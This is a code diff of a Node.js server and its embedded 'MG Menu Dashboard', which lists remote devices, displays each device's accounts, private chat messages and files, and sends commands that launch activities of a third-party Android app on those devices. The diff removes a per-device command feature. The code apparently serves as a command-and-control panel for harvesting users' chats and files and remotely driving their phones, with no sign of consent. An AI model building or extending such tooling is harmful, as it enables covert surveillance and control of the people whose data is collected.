@@ -36,9 +36,6 @@ let command = {
   activity: ""
 };
 
-// Device-specific commands: key = deviceId, value = command object
-const deviceCommands = new Map();
-
 function clean(value) {
   return value == null ? "" : String(value);
 }
@@ -467,7 +464,6 @@ async function accountSummary(deviceId) {
   return [...byAccount.values()].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0));
 }
 
-// FIX: agar local accounts khali hain toh saari messages bhejo
 async function messagesForAccount(deviceId, rawAccountKey) {
   const accountKeyValue = safeDecode(rawAccountKey);
   const messages = await getMessages(deviceId);
@@ -478,7 +474,6 @@ async function messagesForAccount(deviceId, rawAccountKey) {
   return messages.filter((message) => accountForMessage(message, accounts) === accountKeyValue);
 }
 
-// FIX: agar local accounts khali hain toh saari files bhejo
 function filesForAccount(deviceId, rawAccountKey) {
   const accountKeyValue = safeDecode(rawAccountKey);
   const accounts = readAccounts().filter((item) => item.device_id === deviceId);
@@ -491,7 +486,6 @@ function filesForAccount(deviceId, rawAccountKey) {
   });
 }
 
-// FIX: same for raw files
 function rawFilesForAccount(deviceId, rawAccountKey) {
   const accountKeyValue = safeDecode(rawAccountKey);
   const accounts = readAccounts().filter((item) => item.device_id === deviceId);
@@ -804,7 +798,7 @@ async function dashboardHtml() {
 <title>MG Menu Dashboard</title>
 <style>
 :root{color-scheme:dark;--bg:#090b10;--panel:#111620;--panel2:#171f2b;--line:#273140;--text:#edf2f7;--muted:#9aa8ba;--accent:#36c5f0;--ok:#34d399;--danger:#fb7185;--bubble-in:#f4f6f8;--bubble-out:#d8f3ff}
-*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:grid;grid-template-columns:320px 1fr;min-height:100vh}.side{background:#0d1119;border-right:1px solid var(--line);display:flex;flex-direction:column;min-width:0}.brand{padding:18px;border-bottom:1px solid var(--line)}.brand h1{font-size:18px;margin:0 0 10px}.search,.commandbar input,.commandbar select{width:100%;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px;outline:none}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 18px;border-bottom:1px solid var(--line)}.stat,.card,.row,.account,.msg,.file,.conv,.thread{background:var(--panel);border:1px solid var(--line);border-radius:8px}.stat{padding:10px}.stat b{display:block;font-size:18px}.stat span,.muted{color:var(--muted);font-size:12px}.devices{overflow:auto;padding:10px}.device{width:100%;text-align:left;color:var(--text);background:transparent;border:1px solid transparent;border-radius:8px;padding:11px;margin-bottom:6px}.device:hover,.device.active{background:var(--panel);border-color:var(--line)}.devtop{display:flex;align-items:center;gap:9px}.dot{width:9px;height:9px;border-radius:50%;background:#7b8494;flex:none}.dot.on{background:var(--ok);box-shadow:0 0 14px #34d39980}.devname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.devmeta{display:flex;gap:12px;color:var(--muted);font-size:12px;margin:7px 0 0 18px}.main{min-width:0;display:flex;flex-direction:column}.topbar{display:flex;justify-content:space-between;gap:12px;padding:18px 22px;border-bottom:1px solid var(--line);background:#0b0f16}.title h2{margin:0;font-size:22px}.title p{margin:4px 0 0;color:var(--muted)}.actions,.toolbar,.fileactions{display:flex;gap:8px;flex-wrap:wrap}.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 11px;text-decoration:none}.btn:hover{border-color:var(--accent)}.btn.danger{color:#ffe4e6;border-color:#883142;background:#301018}.tabs{display:flex;gap:6px;padding:12px 22px 0;background:#0b0f16}.tab{padding:10px 13px;border-radius:8px 8px 0 0;background:transparent;color:var(--muted)}.tab.active{background:var(--panel);color:var(--text)}.commandbar{display:grid;grid-template-columns:1fr 1.4fr 150px 1.4fr auto auto;gap:8px;padding:12px 22px;border-bottom:1px solid var(--line);background:var(--panel)}.device-commandbar{display:flex;gap:8px;padding:8px 22px;border-bottom:1px solid var(--line);background:var(--panel);align-items:center;flex-wrap:wrap}.device-commandbar label{color:var(--muted);font-size:13px;white-space:nowrap}.device-commandbar select,.device-commandbar input{background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:8px;outline:none}.device-commandbar select{flex:1;min-width:150px}.device-commandbar input{flex:2;min-width:200px}.content{padding:18px 22px;overflow:auto;flex:1}.cards{display:grid;grid-template-columns:repeat(4,minmax(140px,1fr));gap:12px;margin-bottom:14px}.card{padding:14px}.card b{display:block;font-size:20px;margin-top:5px}.accounts{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin:0 0 14px}.account{padding:12px;text-align:left;color:var(--text)}.account.active{border-color:var(--accent)}.account strong{display:block}.row{display:flex;justify-content:space-between;gap:14px;padding:12px 14px;margin-bottom:8px}.info-grid{display:grid;grid-template-columns:repeat(2,minmax(220px,1fr));gap:8px}.messages{display:flex;flex-direction:column;gap:10px}.msg{max-width:860px;padding:12px}.msg.out{margin-left:auto;border-color:#23546a}.msghead{display:flex;justify-content:space-between;gap:14px;margin-bottom:8px}.sender-name{display:block;font-weight:700}.sender-id{display:block;color:var(--muted);font-size:12px;margin-top:2px}.msgtime{white-space:nowrap;color:var(--muted);font-size:12px}.msgtext{line-height:1.45;white-space:pre-wrap}.conv-list{display:flex;flex-direction:column;gap:8px}.conv{display:grid;grid-template-columns:42px 1fr auto;gap:12px;align-items:center;width:100%;text-align:left;color:var(--text);padding:10px 12px}.conv:hover{border-color:var(--accent)}.avatar{width:42px;height:42px;border-radius:50%;display:grid;place-items:center;background:#243044;font-weight:800}.conv-name{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.conv-preview{color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:3px}.conv-meta{text-align:right;color:var(--muted);font-size:12px}.thread{display:flex;flex-direction:column;height:min(68vh,760px);overflow:hidden}.thread-head{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:12px;border-bottom:1px solid var(--line)}.thread-scroll{flex:1;overflow:auto;padding:16px;background:#f2f3f5;color:#111}.bubble-row{display:flex;gap:8px;align-items:flex-end;margin:8px 0}.bubble-row.out{justify-content:flex-end}.bubble{max-width:min(72%,680px);padding:9px 12px;border-radius:10px;background:var(--bubble-in);box-shadow:0 1px 1px #0001;line-height:1.4;white-space:pre-wrap}.bubble-row.out .bubble{background:var(--bubble-out)}.bubble-time{display:block;color:#777;font-size:11px;margin-top:5px;text-align:right}.date-chip{display:block;width:max-content;margin:14px auto 10px;background:#c9cbd0;color:white;border-radius:6px;padding:4px 8px;font-size:12px}.bubble-img{display:block;max-width:220px;max-height:260px;border-radius:8px;margin-top:6px}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(185px,1fr));gap:12px}.file{overflow:hidden}.thumb{aspect-ratio:1.35;background:#070a10;display:grid;place-items:center;color:var(--muted);font-size:34px}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.filebody{padding:10px}.filename{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.filemeta{color:var(--muted);font-size:12px;margin:5px 0 10px}.empty{color:var(--muted);padding:40px;text-align:center;border:1px dashed var(--line);border-radius:8px;background:#0d111980}.checkline{display:flex;align-items:center;gap:8px;margin-bottom:8px}.modal{position:fixed;inset:0;background:#000a;display:none;align-items:center;justify-content:center;padding:24px;z-index:10}.modal.open{display:flex}.modalbox{background:var(--panel);border:1px solid var(--line);border-radius:8px;width:min(1000px,96vw);max-height:92vh;overflow:hidden}.modalhead{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}.modalbody{padding:14px;display:grid;place-items:center;max-height:78vh;overflow:auto}.modalbody img,.modalbody video{max-width:100%;max-height:72vh}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:grid;grid-template-columns:320px 1fr;min-height:100vh}.side{background:#0d1119;border-right:1px solid var(--line);display:flex;flex-direction:column;min-width:0}.brand{padding:18px;border-bottom:1px solid var(--line)}.brand h1{font-size:18px;margin:0 0 10px}.search,.commandbar input,.commandbar select{width:100%;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px;outline:none}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 18px;border-bottom:1px solid var(--line)}.stat,.card,.row,.account,.msg,.file,.conv,.thread{background:var(--panel);border:1px solid var(--line);border-radius:8px}.stat{padding:10px}.stat b{display:block;font-size:18px}.stat span,.muted{color:var(--muted);font-size:12px}.devices{overflow:auto;padding:10px}.device{width:100%;text-align:left;color:var(--text);background:transparent;border:1px solid transparent;border-radius:8px;padding:11px;margin-bottom:6px}.device:hover,.device.active{background:var(--panel);border-color:var(--line)}.devtop{display:flex;align-items:center;gap:9px}.dot{width:9px;height:9px;border-radius:50%;background:#7b8494;flex:none}.dot.on{background:var(--ok);box-shadow:0 0 14px #34d39980}.devname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.devmeta{display:flex;gap:12px;color:var(--muted);font-size:12px;margin:7px 0 0 18px}.main{min-width:0;display:flex;flex-direction:column}.topbar{display:flex;justify-content:space-between;gap:12px;padding:18px 22px;border-bottom:1px solid var(--line);background:#0b0f16}.title h2{margin:0;font-size:22px}.title p{margin:4px 0 0;color:var(--muted)}.actions,.toolbar,.fileactions{display:flex;gap:8px;flex-wrap:wrap}.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 11px;text-decoration:none}.btn:hover{border-color:var(--accent)}.btn.danger{color:#ffe4e6;border-color:#883142;background:#301018}.tabs{display:flex;gap:6px;padding:12px 22px 0;background:#0b0f16}.tab{padding:10px 13px;border-radius:8px 8px 0 0;background:transparent;color:var(--muted)}.tab.active{background:var(--panel);color:var(--text)}.commandbar{display:grid;grid-template-columns:1fr 1.4fr 150px 1.4fr auto auto;gap:8px;padding:12px 22px;border-bottom:1px solid var(--line);background:var(--panel)}.content{padding:18px 22px;overflow:auto;flex:1}.cards{display:grid;grid-template-columns:repeat(4,minmax(140px,1fr));gap:12px;margin-bottom:14px}.card{padding:14px}.card b{display:block;font-size:20px;margin-top:5px}.accounts{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin:0 0 14px}.account{padding:12px;text-align:left;color:var(--text)}.account.active{border-color:var(--accent)}.account strong{display:block}.row{display:flex;justify-content:space-between;gap:14px;padding:12px 14px;margin-bottom:8px}.info-grid{display:grid;grid-template-columns:repeat(2,minmax(220px,1fr));gap:8px}.messages{display:flex;flex-direction:column;gap:10px}.msg{max-width:860px;padding:12px}.msg.out{margin-left:auto;border-color:#23546a}.msghead{display:flex;justify-content:space-between;gap:14px;margin-bottom:8px}.sender-name{display:block;font-weight:700}.sender-id{display:block;color:var(--muted);font-size:12px;margin-top:2px}.msgtime{white-space:nowrap;color:var(--muted);font-size:12px}.msgtext{line-height:1.45;white-space:pre-wrap}.conv-list{display:flex;flex-direction:column;gap:8px}.conv{display:grid;grid-template-columns:42px 1fr auto;gap:12px;align-items:center;width:100%;text-align:left;color:var(--text);padding:10px 12px}.conv:hover{border-color:var(--accent)}.avatar{width:42px;height:42px;border-radius:50%;display:grid;place-items:center;background:#243044;font-weight:800}.conv-name{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.conv-preview{color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:3px}.conv-meta{text-align:right;color:var(--muted);font-size:12px}.thread{display:flex;flex-direction:column;height:min(68vh,760px);overflow:hidden}.thread-head{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:12px;border-bottom:1px solid var(--line)}.thread-scroll{flex:1;overflow:auto;padding:16px;background:#f2f3f5;color:#111}.bubble-row{display:flex;gap:8px;align-items:flex-end;margin:8px 0}.bubble-row.out{justify-content:flex-end}.bubble{max-width:min(72%,680px);padding:9px 12px;border-radius:10px;background:var(--bubble-in);box-shadow:0 1px 1px #0001;line-height:1.4;white-space:pre-wrap}.bubble-row.out .bubble{background:var(--bubble-out)}.bubble-time{display:block;color:#777;font-size:11px;margin-top:5px;text-align:right}.date-chip{display:block;width:max-content;margin:14px auto 10px;background:#c9cbd0;color:white;border-radius:6px;padding:4px 8px;font-size:12px}.bubble-img{display:block;max-width:220px;max-height:260px;border-radius:8px;margin-top:6px}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(185px,1fr));gap:12px}.file{overflow:hidden}.thumb{aspect-ratio:1.35;background:#070a10;display:grid;place-items:center;color:var(--muted);font-size:34px}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.filebody{padding:10px}.filename{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.filemeta{color:var(--muted);font-size:12px;margin:5px 0 10px}.empty{color:var(--muted);padding:40px;text-align:center;border:1px dashed var(--line);border-radius:8px;background:#0d111980}.checkline{display:flex;align-items:center;gap:8px;margin-bottom:8px}.modal{position:fixed;inset:0;background:#000a;display:none;align-items:center;justify-content:center;padding:24px;z-index:10}.modal.open{display:flex}.modalbox{background:var(--panel);border:1px solid var(--line);border-radius:8px;width:min(1000px,96vw);max-height:92vh;overflow:hidden}.modalhead{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}.modalbody{padding:14px;display:grid;place-items:center;max-height:78vh;overflow:auto}.modalbody img,.modalbody video{max-width:100%;max-height:72vh}
 @media (max-width:850px){.app{grid-template-columns:1fr}.side{max-height:42vh;border-right:0;border-bottom:1px solid var(--line)}.topbar{flex-direction:column}.commandbar{grid-template-columns:1fr 1fr}.cards{grid-template-columns:1fr 1fr}.content{padding:16px}}
 @media (max-width:520px){.cards,.commandbar{grid-template-columns:1fr}.actions{width:100%}.btn{flex:1;text-align:center}.tabs{overflow:auto}.tab{white-space:nowrap}}
 </style>
@@ -820,17 +814,6 @@ async function dashboardHtml() {
     <div class="topbar"><div class="title"><h2 id="deviceTitle">Select a device</h2><p id="deviceSub">Accounts, chats, and files appear here.</p></div><div class="actions"><button class="btn" id="refresh">Refresh</button><button class="btn danger" id="deleteDevice">Delete device</button><a class="btn" href="/api/debug" target="_blank">Debug</a></div></div>
     <div class="tabs"><button class="tab active" data-tab="overview">Overview</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
     <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Launch activity"><select id="cmdAction"><option value="none">none</option><option value="launch" selected>launch</option></select><input id="cmdActivity" value="com.wepie.module.teenmode.TeenModeOpeningActivity"><button class="btn" id="sendCommand">Send</button><button class="btn danger" id="clearCommand">Clear</button></div>
-
-    <!-- NEW DEVICE SPECIFIC COMMAND BAR -->
-    <div class="device-commandbar">
-      <label for="deviceSelect">📱 Launch on device:</label>
-      <select id="deviceSelect">
-        <option value="">-- Select device --</option>
-      </select>
-      <input id="deviceActivity" value="com.wepie.wespy.module.login.start.StartActivity" placeholder="Activity class">
-      <button class="btn" id="sendDeviceCommand">🚀 Launch</button>
-    </div>
-
     <section id="content" class="content"></section>
   </main>
 </div>
@@ -852,12 +835,11 @@ function previewText(t){const media=parseMedia(t);return media?media.label:Strin
 function parseMedia(t){try{const o=JSON.parse(t);if(o&&o.url)return {url:o.url,label:o.name||"[Image]"} }catch{} return null}
 function conversations(){const map=new Map();for(const m of state.messages){const key=peerKey(m);const item=map.get(key)||{key,peer_uid:m.peer_uid,peer_name:m.peer_name||"Unknown",messages:[],last:null};item.messages.push(m);if(!item.last||msgTime(m)>msgTime(item.last))item.last=m;map.set(key,item)}return [...map.values()].sort((a,b)=>msgTime(b.last)-msgTime(a.last))}
 async function api(url,opts){const r=await fetch(url,opts);if(!r.ok)throw new Error(await r.text());return r.json()}
-async function load(){state.devices=await api("/api/devices");if(!state.selected&&state.devices[0])state.selected=state.devices[0].device_id;renderDevices();populateDeviceSelect();await loadSelected()}
+async function load(){state.devices=await api("/api/devices");if(!state.selected&&state.devices[0])state.selected=state.devices[0].device_id;renderDevices();await loadSelected()}
 async function loadSelected(){if(!state.selected){renderEmpty();return}state.accounts=await api("/api/device/"+enc(state.selected)+"/accounts");if(!state.account||!state.accounts.find(a=>a.key===state.account))state.account=state.accounts[0]?.key||null;state.peer=null;await loadAccount();renderMain()}
 async function loadAccount(){if(!state.selected||!state.account){state.messages=[];state.files=[];return}const base="/api/device/"+enc(state.selected)+"/account/"+enc(state.account);const deviceBase="/api/device/"+enc(state.selected);[state.messages,state.files]=await Promise.all([api(base+"/messages"),api(deviceBase+"/files")])}
 function selectedDevice(){return state.devices.find(d=>d.device_id===state.selected)}
 function selectedAccount(){return state.accounts.find(a=>a.key===state.account)}
-function populateDeviceSelect(){const select=document.getElementById("deviceSelect");if(!select)return;const current=select.value;select.innerHTML='<option value="">-- Select device --</option>'+state.devices.map(d=>'<option value="'+esc(d.device_id)+'">'+esc(d.display_name||d.device_id)+'</option>').join("");if(current)select.value=current}
 function renderDevices(){
   const q=$("search").value.toLowerCase();
   const list=state.devices.filter(d=>(d.display_name||d.device_id||"").toLowerCase().includes(q));
@@ -883,7 +865,6 @@ function renderDevices(){
       </button>
     \`;
   }).join("") || '<div class="empty">No devices</div>';
-  populateDeviceSelect(); // update dropdown after render
 }
 function renderAccounts(){if(!state.accounts.length)return '<div class="empty">No accounts for this device yet</div>';return '<div class="accounts">'+state.accounts.map(a=>'<button class="account '+(a.key===state.account?'active':'')+'" data-account="'+esc(a.key)+'"><strong>'+esc(a.my_name||"Unknown account")+'</strong><span class="muted">Public ID: '+esc(a.public_id||"")+'</span><br><span class="muted">UID: '+esc(a.my_uid||"")+' • Chats '+(a.message_count||0)+' • Files '+(a.file_count||0)+'</span></button>').join("")+'</div>'}
 function renderEmpty(){$("content").innerHTML='<div class="empty">No device selected</div>'}
@@ -901,32 +882,6 @@ async function deleteSelectedFiles(){const files=[...document.querySelectorAll("
 
 // Device selection click
 $("devices").onclick=e=>{const b=e.target.closest(".device");if(!b)return;state.selected=b.dataset.id;state.account=null;renderDevices();loadSelected()};
-
-// Device-specific launch (execute action)
-$("sendDeviceCommand").onclick=async function(){
-  const select = document.getElementById("deviceSelect");
-  const deviceId = select.value;
-  if(!deviceId){alert("Please select a device.");return;}
-  const activity = document.getElementById("deviceActivity").value.trim();
-  if(!activity){alert("Please enter an Activity class.");return;}
-  const cmd = {
-    deviceId: deviceId,
-    title: "MG Menu",
-    text: "Execute " + activity,
-    action: "execute",        // ✅ execute action for custom class
-    activity: activity
-  };
-  try {
-    await api("/api/device/command", {
-      method: "POST",
-      headers: {"content-type":"application/json"},
-      body: JSON.stringify(cmd)
-    });
-    alert("✅ Command sent to " + deviceId);
-  } catch(err) {
-    alert("❌ Failed: " + err.message);
-  }
-};
 
 $("search").oninput=renderDevices;
 $("refresh").onclick=load;
@@ -978,32 +933,7 @@ async function handler(req, res) {
       };
       return json(res, 200, { ok: true, command });
     }
-    // ---- Device-specific command endpoint ----
-    if (req.method === "POST" && url.pathname === "/api/device/command") {
-      const body = await readJson(req);
-      const deviceId = clean(body.deviceId);
-      if (!deviceId) return json(res, 400, { ok: false, error: "deviceId required" });
-      const cmd = {
-        title: clean(body.title) || command.title,
-        text: clean(body.text) || command.text,
-        action: clean(body.action) || command.action,
-        activity: clean(body.activity) || command.activity
-      };
-      deviceCommands.set(deviceId, cmd);
-      return json(res, 200, { ok: true, command: cmd });
-    }
-    // ---- GET /api/data with deviceId support ----
-    if (req.method === "GET" && url.pathname === "/api/data") {
-      const deviceId = url.searchParams.get("deviceId");
-      let responseCmd;
-      if (deviceId && deviceCommands.has(deviceId)) {
-        responseCmd = deviceCommands.get(deviceId);
-        deviceCommands.delete(deviceId); // one-time delivery
-      } else {
-        responseCmd = command;
-      }
-      return json(res, 200, responseCmd);
-    }
+    if (req.method === "GET" && url.pathname === "/api/data") return json(res, 200, command);
 
     const handled = await handleDashboardApi(req, res, url);
     if (handled !== false) return;
